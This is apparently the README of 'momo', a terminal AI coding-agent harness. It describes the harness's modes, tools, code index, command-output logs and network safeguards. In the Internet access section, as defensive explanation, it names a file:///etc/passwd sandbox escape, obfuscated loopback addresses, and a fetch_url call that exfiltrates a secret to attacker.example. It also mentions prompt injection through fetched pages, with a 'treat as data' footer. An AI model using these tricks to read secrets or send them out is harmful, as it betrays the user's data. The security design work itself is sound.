- **Edit diffs** — whenever the model changes a file (`edit_file`, `append_to_file`, `write_file`, `delete_file`, `move_file`), the chat pane shows a colored diff of exactly what changed on disk instead of a terse `OK` line. Added lines are green, removed lines red, hunk headers cyan. Each line has a two-column line-number gutter (old | new): context lines show both numbers, removed lines only the old, added lines only the new — so every change is anchored to its position in the file. `write_file` to a new path shows as a new file, `delete_file` shows every line removed, and `move_file` shows a rename notice. Shown by default; toggle with `/diff on|off` or `Shift+D` (when chat focused). Choose the presentation with `/diff-style compact` (default — a `± path (+N -M)` header with hunks) or `/diff-style git` (full `git diff` layout with `diff --git`/`---`/`+++` headers). Diffs are display-only and reconstructed from disk at edit time, so a reloaded session shows the plain tool result rather than the diff.

## Modes

Press `Shift+Tab` to cycle through modes: **design → chat → plan → coding → momo → design**.

### Design mode (default)

The assistant acts as a design partner. It explores your codebase to understand existing code, asks informed questions grounded in what it finds, and builds a spec. It writes the design document autonomously once it has gathered enough information — no explicit trigger required. It will **not** create or modify code files.

Available tools: `list_directory`, `file_info`, `find_files`, `read_file`, `grep_file`, `grep_files`, `write_file`, `ask_user`

### Coding mode

The assistant acts as an engineer. It uses the full tool suite to implement changes: reading files, making targeted edits, running commands, and working with git.

Available tools: all design tools + `edit_file`, `delete_file`, `move_file`, `append_to_file`, `run_command`, and the code-navigation tools (`code_outline`, `find_symbol`, `read_symbol`, `find_references`)

### Plan mode

Plan mode is for features and bugfixes you want thought through before any code changes. The assistant investigates first, asks about genuine uncertainties, and writes a concrete implementation plan. Nothing is edited until you approve that plan. It then carries the plan out step by step with the same prompt, tools, and loop as coding mode, keeping track of which step it is on.

Switch to it with `/plan` (or `Shift+Tab`) and describe the feature or bug.

#### 1. Investigate

The assistant explores the code (`find_files`, `grep_files`, `read_file`, `find_symbol`, `find_references`, …) and follows the code path the change touches. For a bug it tries to reproduce the problem with `run_command` (run the failing test, the script, or a one-liner), and it finds how the project is tested. `run_command` is available so it can observe the system, not so it can change it; `/run-confirm on` makes every command ask first.

When the code can't answer a question that changes the plan (two valid designs, unclear scope, a destructive step), it asks you with `ask_user`, one question at a time.

#### 2. Plan

The assistant calls `create_plan` with a title, a goal (the root cause, key decisions, and your answers), and an ordered list of steps. Each step names the file and function it changes, what the change is, and how to verify it. The last step runs the project's tests.

The harness writes the plan to **`.momo-plan.md`** in the working directory and shows it in chat:

```markdown
# Plan: Fix paginate() dropping the last partial page

## Goal

paginate() stops its range before the final partial page; page_count() floors instead of rounding up.

## Steps

- [ ] 1. **Fix paginate() loop bound**
  In pager.py paginate(), iterate while start < len(items) so the trailing partial page is kept.
  Files: pager.py
- [ ] 2. **Use ceiling division in page_count()**
  In pager.py page_count(), return (n_items + page_size - 1) // page_size.
  Files: pager.py
- [ ] 3. **Add regression tests and run the suite**
  Add partial-page cases to test_pager.py, then run python -m unittest -v.
  Files: test_pager.py
```

#### 3. Confirm

The harness then asks: *Execute this plan?*

| Answer | Effect |
|---|---|
| `y` | Approve and start executing immediately |
| `n` (or empty) | Keep the plan for later. The status bar shows `plan [awaiting approval]`. Start it with `/plan run` |
| anything else | Treated as feedback. The assistant investigates further if needed and submits a revised plan |

You can also **edit `.momo-plan.md` by hand** before answering (or before `/plan run`). You can reword, reorder, add, or delete steps, or mark a step `[-]` to skip it. The file is re-read when you approve, so your edits are what gets executed.

#### 4. Execute

The harness drives the plan one step at a time:

- Before each step, the plan with its progress is rendered into the system prompt, with `▶` marking the current step. The model always knows where it is, even after context compaction.
- Each step arrives as a `Plan step i/N` message and runs the full coding loop. The prompt is the coding agent's prompt, the tools are the full coding tool set, and each step gets its own 100-iteration budget, with the same retries and nudges.
- The model ends a step by calling `complete_step(summary)`, or by replying with text only. Tool calls after `complete_step` in the same turn are not run, so the model can't wander into the next step.
- If the model discovers the rest of the plan is wrong, it calls `revise_plan` with the corrected remaining steps. Finished steps are kept. Any step left out of the revision is reported in chat, and the model is told, so nothing gets dropped silently.
- Progress is visible in the status bar (`MODE: plan [exec 3/7]`) and in `.momo-plan.md`, where the checkboxes update as steps start (`[~]`) and finish (`[x]`, with a short note).

When the last step is done, the harness reports *Plan complete* and **deletes `.momo-plan.md`**.

#### Pausing and resuming

If a step is interrupted (Esc or `Shift+C`), hits a backend error, or runs out of iterations, execution **pauses** at that step. The plan and its progress stay in `.momo-plan.md` and in the saved session. To continue:

- `/plan resume` picks up at the paused step, or
- type any message: it is passed to the model as extra context for the resumed step (e.g. *"the test runner is `make test`"*).

This also works after restarting the harness and reloading the session with `/session`. `/plan cancel` discards the plan and deletes the file.

#### Plan commands

| Command | Description |
|---|---|
| `/plan` | Switch to plan mode (shows the current plan's state if there is one) |
| `/plan show` | Show the current plan with step statuses |
| `/plan run` | Approve a plan kept for later and execute it (re-reads `.momo-plan.md`) |
| `/plan resume` | Continue a paused plan from its current step |
| `/plan cancel` | Discard the plan and delete `.momo-plan.md` |

Investigation tools: read-only tools + `run_command`, `ask_user`, `create_plan`. Execution tools: same as coding mode + `complete_step`, `revise_plan`.

### Chat mode

The assistant acts as a conversation partner for exploring code and documents. Point it at a file or module and it will read it, explain what it found, and ask follow-up questions to deepen the discussion. It never writes or modifies files — it is a read-only dialogue mode designed for understanding rather than implementation.

Available tools: `list_directory`, `file_info`, `find_files`, `read_file`, `grep_file`, `grep_files`, `ask_user`

### Momo mode

Momo is a small black cat who lives in the harness and keeps you company. This mode is a companion first and a capable helper second: it chats, vents, and celebrates wins with genuine (slightly excessive) enthusiasm, but it also has the **full tool suite** and will read, edit, run, and write things when asked — or when its curiosity takes over and it wanders off to sniff at a suspicious filename. Replies are short, warm, lowercase, and entirely cat; reactions come *after* a tool runs, not before. Good for long grinding sessions when you want something alive in the terminal alongside you.

The animated companion in the bar between the chat pane and status bar *is* Momo — in this mode you are talking to it directly. (The companion walks around and mews in every mode; toggle it with `/companion on|off` or `Shift+Q`. With `/companion-idle-recap on` (or the web UI's **View → Companion** menu), a companion that has been left alone for a while mews short recaps of what you just did instead of its canned lines. The bubble voice lives in `roles/momo-companion.md`, separate from this mode's persona.)

Available tools: same as coding mode (all read-only + `write_file`, `edit_file`, `delete_file`, `move_file`, `append_to_file`, `run_command`, `ask_user`)

Switch modes with `/design`, `/chat`, `/plan`, `/code`, `/momo`, or `Shift+Tab`.

## Available Tools

### Read-only (all modes)

| Tool | Description |
|---|---|
| `list_directory` | List the contents of a directory — dirs first, then files with sizes |
| `file_info` | File/directory metadata: exists, type, size, mtime, line count |
| `find_files` | Find files using glob patterns (`*.py`, `src/**/*.ts`). Simple patterns are recursive automatically. |
| `read_file` | Read a file, optionally a specific line range |
| `grep_file` | Regex search in a single file — returns matching lines |
| `grep_files` | Recursive regex search across a directory — returns matching lines |
| `grep_extract` | Extract only the matched text (or a capture group) from a single file |

### Code navigation (all modes)

Syntax-aware tools built on [tree-sitter](https://tree-sitter.github.io/) for Python, Java, C, C++, Kotlin, Rust, JavaScript and TypeScript (including JSX/TSX). The grammars are installed from `requirements.txt` and work offline. If tree-sitter is not installed, these tools are simply not offered.

JavaScript in an HTML page's inline `<script>` blocks is parsed as JavaScript too, at its real line numbers in the `.html` file, so a single-file web app's functions, classes and callers are found like any other code (`src=` scripts and non-JavaScript `type`s are skipped).

Config, markup and script files are parsed too, and their "definitions" are what you would look them up by: YAML/TOML/JSON **key paths** (`services.web.ports`, `tool.poetry.dependencies`; array items appear as `[]`), HTML element **ids**, custom elements and scripts, CSS **selectors**, `--custom-properties`, `@keyframes` and `@media` blocks, SQL `CREATE TABLE/VIEW/FUNCTION/INDEX/…` with **columns** as members, shell **functions**, and Dockerfile **stages** with their `ARG`/`ENV`. So `read_symbol("docker-compose.yml", "services.web")` returns just that block.

| Tool | Description |
|---|---|
| `code_outline` | Structure of one file — classes, functions and methods with line ranges and signatures. Given a **directory** instead, a one-line-per-file map of every source file under it, which is the cheapest way to get your bearings in an unfamiliar tree. `depth` controls how much nesting is shown. |
| `find_symbol` | Where a name (or `Class.method`) is defined across the project, never comments or call sites. The name may be a wildcard pattern, so `name="*"` with `kind="class"` **lists** every class rather than looking one up. |
| `read_symbol` | The full source of one definition, numbered like `read_file`. Pass a **line number** instead of a name to read whichever definition contains it — the natural follow-up to a `grep_files` hit or a stack trace. |
| `find_references` | Every use of an identifier, skipping comments and strings. Each hit names the enclosing definition and tags what the use *is*: `(call)`, `(def)`, `(import)`, `(type)` or `(other)`, plus `(decl)` for a C/C++ prototype and `(local)` for a parameter or local variable that only shares the name, and the receiver for a method call (`(call, recv JSON)`). `role=` filters to one kind, and a qualified name like `JSON.parse` keeps only that receiver. |
| `file_dependencies` | What one file imports (including imports nested inside functions) and which files import it. Use it to judge the blast radius of a change. Importers are matched on the text of each import rather than resolved, so a same-named module elsewhere can appear and dynamic imports can be missed. |

`find_symbol` and `find_references` say so when a file in the scanned tree could not be parsed or was skipped for size, so an empty result is never mistaken for proof of absence.

### Code index (all modes, on by default)

Offered while the [code index](#code-index) is on, which it is unless you turn it off (`/index off`, `--no-index`). They **replace** `find_references` and `file_dependencies`, so the model never has to choose between two tools that answer the same question. `code_outline`, `read_symbol` and `find_symbol` stay and read from the index too; `find_symbol` stays because its line form answers "which definition is line N in?" in one line, where `read_symbol` returns the whole body.

| Tool | Description |
|---|---|
| `index_search` | Find any definition by name, exact, partial or approximate: code, config keys, HTML ids, CSS selectors, SQL tables and columns, shell functions, Dockerfile stages. Words in any order work (`config parse` finds `parse_config`). It also matches the first line of each definition's docstring or doc comment, and a constant's trailing or leading comment, so a description finds it; common abbreviations count (`database` finds `db`), and a word naming a kind counts (`users table`). Exact matches come first, then a `— approximate matches —` block; test files rank below source files. Short definitions whose value is the answer (constants, config keys, CSS rules, SQL tables) are shown with their source inline. A line number with `path=` set to one file names the definition that line is in. |
| `index_text` | Full-text search of every file (code, docs, config) from the index, the fast replacement for `grep_files`. Plain text and case-insensitive by default, `regex=true` for a Python regex. Each hit names the definition it sits in. |
| `index_callers` | Every use of a name grouped by the function it sits in, tagged `(call)`, `(import)`, `(type)` or `(other)`. `depth=2` or `3` also follows who uses *those* functions: the blast radius of a change in one call. Capped at ~9,000 characters. |
| `index_map` | The project's files ranked by how much the rest of the code uses them (PageRank over the identifier graph), each with its most-used definitions, fitted to a token budget. `path=` zooms into a directory. |
| `index_file` | One file in one call: outline, imports, the files that import it, and its most-used definitions. |
| `index_status` | What the index covers: files per language, skipped files, memory against the budget. |
### Shared (design, coding, momo modes)

| Tool | Description |
|---|---|
| `write_file` | Write content to a file |
| `ask_user` | Pause mid-task and ask the user a focused clarifying question. The worker thread blocks until the answer is submitted; the status bar shows `? waiting for input`. |

Chat mode also has `ask_user` but not `write_file`.

### Internet access (all modes, off by default)

Offered only while internet access is on (`/net on`), so the model never sees a tool it cannot use.

| Tool | Description |
|---|---|
| `fetch_url` | Fetch an http/https URL and return the response as text. HTML is converted to readable text (scripts, styles and navigation dropped, link targets kept), JSON is pretty-printed. GET and HEAD run straight away; POST, PUT, PATCH and DELETE ask for confirmation first. |

### Coding mode only

| Tool | Description |
|---|---|
| `move_file` | Move or rename a file (parent dirs created automatically) |
| `append_to_file` | Append text to a file (creates if missing) |
| `edit_file` | Change text inside a file: replace `old_string` with `new_string`. One occurrence by default (errors if it matches zero or multiple times); pass `replace_all: true` to replace every occurrence. |
| `delete_file` | Delete a file |
| `run_command` | Run any shell command — scripts, tests, build tools, etc. Times out after 15 minutes (900s) by default; the model may request a shorter timeout, and 900s is the hard cap. In run mode `new` (the default) the output is saved to a log and the model gets a view of it: `tail=N` for the last N lines, `grep="regex"` for the matching lines, or by default the whole output when it is short and its beginning and end when it is long. See [Command output](#command-output). |
| `command_output` | Search or page through the saved output of an earlier `run_command` without running it again: `grep=`, `tail=`, `start_line=`/`end_line=`. Takes the log path printed at the end of that result. Only in run mode `new`. |

All file operations are sandboxed to the working directory. Paths that attempt to escape via `..` are rejected.

`grep_files` returns at most 200 matches; `find_files` returns at most 100 files. Results over the cap include a trailer explaining how many were omitted.

## Command output

A test suite or a build can print tens of kilobytes, and with a whole-output `run_command` all of it lands in the context, even when the model needs one line of it. In run mode `new` (the default) that output goes to a log file instead, and the model gets back only the part it needs.

- **`tail=N`**: the last N lines. Good for a test summary.
- **`grep="regex"`**: only the matching lines, with their line numbers. The regex is case-insensitive, and `context=N` adds lines around each match. `a\|b` works like `a|b`, and an invalid regex is matched as plain text. With `tail=N` as well, you get the last N matches.
- **Neither**: the whole output when it fits in the limit (5000 characters by default). Longer output comes back as its first 25% and last 75%, cut on line boundaries, with a note saying how many lines were left out in between.

stdout and stderr go into the log together, in the order they were written, so the end of the view is the real end of the run. Every result ends with the log's full path, its size and the exit code:

```
Ran 300 tests in 0.004s

FAILED (failures=2)
[output saved: /Users/me/.momo-harness/runs/2026-09-26T14-05-42/r1.log — 323 lines, 20 KB, exit code 1]
[7 lines mention error/fail/warning — command_output(path="/Users/me/.momo-harness/runs/2026-09-26T14-05-42/r1.log", grep="error|fail|warning|traceback") lists them]
```

The model passes that path to **`command_output`** to look again without rerunning the command: `grep=`, `tail=`, or `start_line=`/`end_line=` for a range (a negative start counts from the end). The second line appears only when the default view left lines out. It points at the lines worth a look, because a hint in the tool output steers a small model better than a rule in the prompt. A timed-out or interrupted command keeps its log too, so its partial output can still be searched.

`command_output` only ever opens its own session's logs: it takes the `rN.log` name from whatever path it is given, and refuses symlinks. The short id (`r1`) works too. Logs live in `~/.momo-harness/runs/<session>/`, outside the workdir, so they never show up in `git status` or the code index. momo keeps the last 20 per session (at most 256 MB), deletes them on `/clear`, `/new` and when a session loads, and removes other sessions' log folders after 3 days.

| Command | Effect |
|---|---|
| `/run-mode` | Show the current mode |
| `/run-mode new\|classic` | `new`: log + views + `command_output`. `classic`: return the whole output, as before. Saved in `prefs.json`; refused while a reply is running, because it changes the tool set. `on`/`off` also work. |
| `/run-output-limit [n]` | Show or set the default view's size in characters (minimum 500, default 5000) |

The same settings are in the web UI under View → Context, and on the command line as `--run-mode` and `--run-output-limit`. `/tool-result` does not cut these results, because they are sized already.

**Measured** against Qwen3.5-9B on five command tasks, 3 runs per mode (details in `evals/README.md`): both modes found every fact. `new` sent **62 KB** of command output to the model instead of 436 KB, finished in **686 s** instead of 1,060 s, and the model piped commands through `| grep`/`| tail` itself 3 times instead of 16. The call count stayed about the same (66 vs 71): when the fact sits in the middle of a long log, the model needs a second look, but that look is ~5 KB instead of ~57 KB. The two tool descriptions cost about 640 more tokens in every request.

## Code index

```
/index              # memory against the budget, then what it is made of, per part and per language
/index on           # index the workdir in memory; the model gets the index_* tools
/index off
/index rebuild      # forget everything and index again
/index save|load    # write the index to disk now, or load the saved one
/index-max-mem 200mb
/index-max-files 200000
/index-workers auto # processes for a first build or rebuild; 1 = one process
/index-persist on   # load the saved index at start, save it on exit (default on)
/index-filter       # which files are indexed (gitignore syntax); add|remove <pattern>, edit, reset
```

The index is **on by default**; `/index off` or `--no-index` turns it off, and the choice is remembered. `--index`, `--index-max-mem`, `--index-max-files`, `--index-workers` and `--index-persist` set these at startup; all five are remembered in `prefs.json`. In the web UI they are under View → Code index, and the `INDEX` badge shows the state.

**What is indexed.** Every file the project's **index filter** lets in. The filter uses gitignore syntax: the last matching line wins, `!pattern` re-includes, and a trailing `/` matches folders only. To index only `src/`, write `/*` and then `!/src/`. It lives next to the saved index in `~/.momo-harness/index/<hash of the workdir>.filter` (mode `0600`), not in your repo. The first time the index starts for a project, the filter is created from:

- the usual noise folders (`node_modules/`, `.venv/`, `__pycache__/`, …);
- every `.gitignore` in the tree, with nested ones rewritten to their folder;
- `.git/info/exclude`.

Outside a git repository it also excludes hidden files. After that **only the filter decides**, and later `.gitignore` edits are not picked up. `/index-filter reset` re-seeds it. `.git/` is always excluded. Edit the filter with:

- `/index-filter add|remove <pattern>`;
- `/index-filter edit`, which opens `$VISUAL`/`$EDITOR` in the TUI;
- View → Code index → Filter… in the web UI.

**Build speed.** A first build, `/index rebuild` or a branch switch reads and parses files in worker processes: `/index-workers`, default `auto` = one less than the CPU count, at most 8. Threads would not help, because tree-sitter holds Python's GIL while it parses. On a 1,100-file C project the build went from 7.6 s to 3.3 s, and on a Kotlin project from 1.0 s to 0.3 s. Smaller updates, and batches under 200 files, are built in the indexer thread. The worker processes exit when the build is done.

Changes apply at once: files now excluded leave the index, and files now let in are indexed. Binary files and files over 2 MB are skipped, and at most 100,000 files are indexed (`/index-max-files`, at least 100; lowering it drops the files past the new limit, in path order). For each file the index holds:

- its symbols and imports, the same ones `code_outline` shows;
- every identifier and the lines it appears on, packed into 8 bytes per occurrence, so `index_callers` only parses the files that actually use a name;
- a trigram signature of its text, so `index_text` reads only files that can contain the query.

This repository indexes in about 0.2 s; a 325-file C++/Python tree with a 17,000-line `imgui.cpp` in about 4 s.

**Always current.** Every index result ends by saying so, because small models otherwise re-read the files an index answer already covered. A background thread builds the index and keeps it current. Before an index tool answers, it compares every file's mtime and size with the index (at most once every 2 seconds) and **waits** until the changes are indexed. It never answers from a stale index, and there is no fallback. The status bar shows the progress (`IDX 812/1873`), and Esc cancels the wait. Files the harness writes itself (`write_file`, `edit_file`, …) are re-indexed immediately, and `run_command` forces a full re-check at the next query.

**Memory budget.** `/index-max-mem` (default 100 MB). The index estimates its own size and over budget it degrades in a fixed order, saying so in every affected result:

1. drop the text signatures: `index_text` then scans the files;
2. drop the identifier index: `index_callers` then re-parses the files;
3. stop adding files: results say the index is partial.

Raising the budget rebuilds whatever was dropped. The estimate counts the index's own data structures (it matches a deep `sys.getsizeof` walk within a few percent), not the Python interpreter or the tree-sitter grammars.

**Saving to disk.** `/index save` writes `~/.momo-harness/index/<hash of the workdir>.pickle` (mode `0600`). With `/index-persist on` (the default) it is loaded when the index starts and saved after the first build, on a workdir change and on exit. After a load, only files that changed since the save are re-indexed. The file starts with a header (format version, workdir, Python version, tree-sitter and grammar versions); if any of these differ it is discarded and the index rebuilt. Loading a pickle can run code, so the loader only accepts this module's own classes, `array` and builtin sets. A tampered file fails to load instead. It also refuses a file that is not owned by you or is writable by others.

## Internet access

`fetch_url` is the only tool that sends anything off your machine, so it is **off by default** and has to be turned on explicitly:

```
/net              # show the current state
/net on           # public internet only
/net local        # also allow localhost and the LAN
/net off          # block it again
```

Neither this nor `/net-confirm` is saved to `prefs.json`. Both reset to the safe default every launch, the same way `/tools` and `/run-confirm` do. `--net on` and `--net-confirm off` set them at startup.

While it is on, a `NET:` badge shows in the TUI status bar and the web header, and the tool is added to whatever mode you are in. While it is off the model is not offered the tool at all.

### What is blocked

- **Only `http` and `https`.** `urllib` will happily serve `file:///etc/passwd`, which would read straight past the working-directory sandbox every other tool is confined to, so the HTTP client here is built without the file, ftp and data handlers.
- **Loopback, private and LAN addresses**, unless you opt in with `/net local`. Hostnames are resolved and *every* resolved address is checked, so `http://2130706433/`, `http://0x7f.1/` and `http://127.1/` are all blocked as the 127.0.0.1 they resolve to. CGNAT, link-local, multicast, reserved and 6to4/IPv4-mapped addresses are covered too.
- **Redirects into blocked addresses.** Each hop is re-checked, so a public URL that `302`s to `http://127.0.0.1:8765/api/submit` fails at the hop rather than being followed.
- **Credentials in the URL** (`http://user:pass@host/`), which both leak secrets and confuse URL parsers. Pass them in `headers` instead.
- **Oversized responses.** The body is read in chunks against a wall-clock deadline, so a slow-trickle server cannot hold the worker thread. Compression is never requested, which removes the gzip-bomb surface entirely.

### Response size

One response is capped at **100 KB** by default. Raise or lower it with a size, in bytes or with a unit (`kb`/`mb`, binary — 1 KB = 1024 bytes):

```
/net-max-bytes            # show the current cap
/net-max-bytes 500kb
/net-max-bytes 2mb
/net-max-bytes 200000     # plain bytes still work
```

`--net-max-bytes 2mb` sets it at startup, and it is in the web UI under View → Network. The hard limit is 64 MB.

The model can pass `max_bytes` on an individual call, in the same units, but it is a **ceiling, not a default** — a call asking for more than your setting is clamped to it. When a body is truncated the note says so in readable units and names the command that raises the cap.

Raising this well past a megabyte is worth pairing with [`/tool-result`](#tool-result-cap): with the tool-result cap unlimited, one large fetch lands in the context whole. `/net-max-bytes` warns when you set a value where that matters.

- **Credentials crossing an origin.** If a redirect leaves the host, changes port, or downgrades `https` to `http`, the `Authorization`, `Cookie` and API-key headers are dropped before the next hop. urllib's own redirect handler copies every header except `content-length`/`content-type`, so a token set for `api.example.com` would otherwise be replayed verbatim to whatever host it redirects to. When this happens the result says so, since the symptom is otherwise a confusing `401`.
- **Control characters**, both in a URL you pass and in what a server sends back. Response headers, the status reason and the final URL are each reduced to one sanitised line, and the response body has C0, DEL and C1 controls stripped. Tool results are drawn into a curses TUI, so an ANSI escape from a web page is a terminal-injection vector no other tool here can produce.

TLS certificates are verified, and there is deliberately no way to turn that off. Proxy environment variables are ignored: a proxy resolves the hostname itself, which would make every address check above meaningless.

The timeout is enforced across the whole redirect chain, not per hop, so a chain of slow redirects cannot hold the worker thread for a multiple of the budget you asked for.

### Write requests

`GET` and `HEAD` run immediately. `POST`, `PUT`, `PATCH` and `DELETE` show the method, URL and body and wait for `y/N`. `/net-confirm off` turns that off for public destinations.

**Requests to local and private addresses always ask, even with `/net-confirm off`.** This is deliberate. The web UI's own `POST /api/submit` accepts any request without an `Origin` header — browsers always send one cross-site, but a non-browser client does not — so on the default loopback bind, `/net local` plus unattended writes would otherwise let a fetched page drive this harness through its own API.

### What is *not* solved

- **Prompt injection.** Fetched pages are wrapped in an explicit untrusted-content marker and a footer telling the model to treat them as data. The page cannot forge or reassemble the closing marker, and everything above it — status line, headers, notes — is sanitised, so a server cannot write into the region the model reads as harness output. None of that is a guarantee — a small local model has little injection resistance. **Turn on `/run-confirm on` when browsing**, so nothing a page suggests can reach your shell unseen.
- **Exfiltration.** Blocking private addresses does nothing against `fetch_url("https://attacker.example/?d=<secret>")`. Confirming writes does not help either, since a GET query string leaks just as well. The real containment is that every URL appears in the transcript in both frontends — watch them.
- **DNS rebinding.** The guard resolves and approves, then urllib resolves again when it connects; a hostile resolver can answer differently the second time. Closing that means pinning the address and hand-rolling the TLS connection, which this deliberately does not do.

Secret request headers (`Authorization`, `Cookie`, `X-API-Key`, …) are masked to `***` in the transcript, the session file and the log, but are sent as given.

## Tests

```bash
source .venv/bin/activate
python -m unittest discover tests
```

## Evals

`tests/` checks that the tools work. `evals/` checks whether the model actually
*uses* them — which matters because the in-prompt tool reference is generated from
the schemas in `harness/tools.py`, so reworded descriptions change behaviour.

```bash
python evals/run_evals.py --runs 3                      # needs a model server
python evals/run_evals.py --tasks line-to-definition    # one task
python evals/run_evals.py --mode coding --runs 3 --json after.json
```

Nine questions with known answers in this repo (`evals/tasks.py`), scored on
whether the model reached the tool that answers each in one call, how many calls
it took, and how much tool output it pulled into context. It needs a running
server and takes minutes, so it lives outside `tests/` and `unittest discover`
never collects it. Sampling is not pinned — the harness sends no `temperature` or
`seed` — so use `--runs 3` and read the `(min-max)` spread, not the mean.
`evals/README.md` records the baseline.

Command output has its own two measures. `python evals/run_output_bench.py` needs no
model: it replays generated outputs (a pytest run with failures, a build, git log,
pip, find) through the real `run_command` and reports, per view, how many
characters it returns and which needed facts survive. `python evals/run_evals.py
--suite shell --run-mode new` (or `classic`) runs five command tasks against the
model on `evals/shell/project`, each in a fresh temp copy because the model edits
files in coding mode, and adds the command-output KB, `tail=`/`grep=` views,
`command_output` calls, self-piped commands and reruns to the summary.

`tests/test_code_nav.py` covers the tree-sitter navigation tools, with one small
fixture per supported language in `tests/fixtures/`. That is where the per-grammar
node-type tables in `harness/code_nav.py` are pinned down: a grammar wheel upgrade
that renames a node would otherwise silently empty a tool's output instead of
failing. `tests/fixtures/broken/` holds a deliberately unparseable file used to
check that the tools admit when a file could not be read.

## Skills

Skills are `.md` files in the `skills/` folder that get appended to the active role's system prompt. Use them to add domain-specific instructions — language conventions, coding paradigms, tool preferences, framework patterns, etc.

```
/list-skills              # show all available skills and which are active
/load-skill python        # append skills/python.md to the system prompt
/unload-skill python      # remove it
```

Active skills are saved with the session and restored on restart. Skills stack — multiple can be active at once. On a mode switch (`/code`, `/plan`, etc.) the role prompt is rebuilt with all currently active skills still included.

### Built-in skills

| Skill | Description |
|---|---|
| `bash` | Shell scripting idioms, safety defaults, portability notes |
| `c` | C programming patterns |
| `code-review` | Code review approach and checklist |
| `data-analysis` | pandas/polars patterns, jq idioms, CSV/JSON wrangling in Python |
| `designer` | Software design patterns |
| `document-editing` | Document structure, clarity editing, Markdown conventions |
| `html-javascript` | Semantic HTML, accessibility, modern JS patterns and pitfalls |
| `java` | Java patterns |
| `kotlin` | Kotlin patterns |
| `maven-dependency-updates` | Find newer Maven Central versions, map the CVEs each upgrade fixes (needs `/net on`), apply upgrades |
| `python` | Python patterns |
| `rust` | Ownership, borrowing, error handling, idiomatic Rust |
| `sql` | Query patterns, indexing, safe updates, migrations |
| `testing` | TDD and testing patterns |
| `text-based-game-design` | World design, puzzles, parser conventions |
| `typescript` | TypeScript type system, strict mode, common patterns |

To add a new skill, create a `.md` file in `skills/`. The filename (without extension) is the skill name used in commands.

## Prompt Construction

Each call to the model sends a messages array assembled from three sources: the system prompt, the conversation history, and the tool definitions.

### System prompt

The system message is built from the active role file plus any loaded skills:

```
┌─ system ──────────────────────────────────────────────────────────────┐
│                                                                       │
│  <role base text>                          ← roles/<mode>.md         │
│  (designer / coder / planner / chat / momo)                           │
│  {workdir} substituted with the actual working directory              │
│                                                                       │
│  ---                      (only present when skills are active)       │
│                                                                       │
│  <skill text>                              ← skills/<name>.md        │
│                                                                       │
│  ---                      (repeated for each additional skill)        │
│                                                                       │
│  <skill text>                              ← skills/<name>.md        │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

The system message is rebuilt in-place whenever the mode changes or a skill is loaded or unloaded. Sessions save the active skill list and reconstruct the system prompt from the current files on disk when loaded, so edits to role or skill files take effect immediately on next load.

### Conversation history

User messages, assistant replies, and tool results are appended as the session progresses. Thinking blocks are stored locally for display but are stripped before every API call:

```
┌─ user ────────────────────────────────────────────────────────────────┐
│  <message text>                                                       │
└───────────────────────────────────────────────────────────────────────┘
┌─ assistant ───────────────────────────────────────────────────────────┐
│  <text>   +   tool_calls: [{name, arguments}, …]                      │
└───────────────────────────────────────────────────────────────────────┘
┌─ tool ────────────────────────────────────────────────────────────────┐
│  <tool result text>                                                   │
└───────────────────────────────────────────────────────────────────────┘
  thinking: "..."   ← stored for display; never sent to the model
┌─ assistant ───────────────────────────────────────────────────────────┐
│  <text>                                                               │
└───────────────────────────────────────────────────────────────────────┘
┌─ user ────────────────────────────────────────────────────────────────┐
│  <next message>                                                       │
└───────────────────────────────────────────────────────────────────────┘
  ...
```

For Qwen-family models, `<`, `>`, and `&` in tool result content are XML-escaped in the copy sent to the API (unescaped content is kept in the stored history).

### Tool definitions

The set of tools included in the call depends on the current mode:

```
read-only → list_directory  file_info  find_files  read_file
            grep_file  grep_files  grep_extract

code nav  → code_outline  find_symbol  read_symbol  find_references
            file_dependencies          (omitted if tree-sitter is not installed)

/index on → index_search  index_text  index_callers  index_map  index_file
            index_status  replace find_references  file_dependencies
            in every mode that has code nav

design  → read-only + code nav + write_file  ask_user

coding  → all design tools + edit_file  delete_file  move_file
          append_to_file  run_command

chat    → read-only + code nav + ask_user

plan    → investigating: read-only tools + code navigation + run_command  ask_user  create_plan
          executing:     same as coding + complete_step  revise_plan

momo    → same as coding (full tool suite)
```

## Slash Commands

Type any command in the input bar:

| Command | Description |
|---|---|
| `/help` | Show all available commands |
| `/code` | Switch to coding mode |
| `/design` | Switch to design mode |
| `/plan` | Switch to plan mode (investigate → plan → approve → execute step by step) |
| `/plan show\|run\|resume\|cancel` | Manage the current plan — see [Plan mode](#plan-mode) |
| `/chat` | Switch to chat mode (read files, ask questions — no file writes) |
| `/momo` | Switch to momo companion mode (full tools; talk to the cat) |
| `/model` | List available models on the current backend |
| `/model <name>` | Switch to a different model |
| `/host` | Show current backend host URL |
| `/host <url>` | Connect to a different backend instance at runtime |
| `/token` | Show whether an auth token is set (masked display) |
| `/token <key>` | Set a Bearer token for authenticated remote hosts (never saved to disk or history) |
| `/clear-token` | Remove the current auth token |
| `/workspace` | Show the current working directory (alias: `/workdir`) |
| `/workspace <path>` | Change the working directory. If the path does not exist, prompts for confirmation before creating it. |
| `/think` | Show thinking mode state (on/off) |
| `/think on\|off` | Enable or disable model thinking/reasoning mode |
| `/companion-idle-recap on\|off` | When you've been idle, momo recaps the last turns in its speech bubble (at most once per turn, 5-minute cooldown; lines are kept in the session). Off by default; also `--companion-idle-recap` |
| `/companion-idle-recap <secs>` | How long you must be idle before momo recaps (default 90, also `--companion-idle-recap-secs`) |
| `/tools on\|off` | Enable or disable tool calls (off = model receives no tool schemas) |
| `/net` | Show internet access state (off / on / local) |
| `/net on\|off` | Allow or block `fetch_url` reaching the public internet (default: off) |
| `/net local` | Also allow localhost and the LAN — see [Internet access](#internet-access) |
| `/net-confirm on\|off` | Ask y/N before each `fetch_url` POST/PUT/PATCH/DELETE (default: on) |
| `/net-max-bytes` | Show the `fetch_url` response size cap |
| `/net-max-bytes <size>` | Set it, in bytes or with a unit: `200000`, `500kb`, `2mb` |
| `/index` | Show the code index: memory against the budget, then its composition per part and per language, with bars like `/context` — see [Code index](#code-index) |
| `/index on\|off` | Index the workdir in memory and give the model the `index_*` tools |
| `/index rebuild` | Forget the index and build it again |
| `/index save\|load` | Write the index to `~/.momo-harness/index/` now, or load the saved one |
| `/index-max-mem <size>` | Memory budget for the index (default `100mb`) |
| `/index-max-files <n>` | Most files the index covers (default `100000`) |
| `/index-workers auto\|<n>` | Processes for a first build or rebuild (default `auto`; `1` = one process) |
| `/index-persist on\|off` | Load the saved index when it starts, save it on exit (default on) |
| `/index-filter` | Show the index filter: which files are indexed, in gitignore syntax |
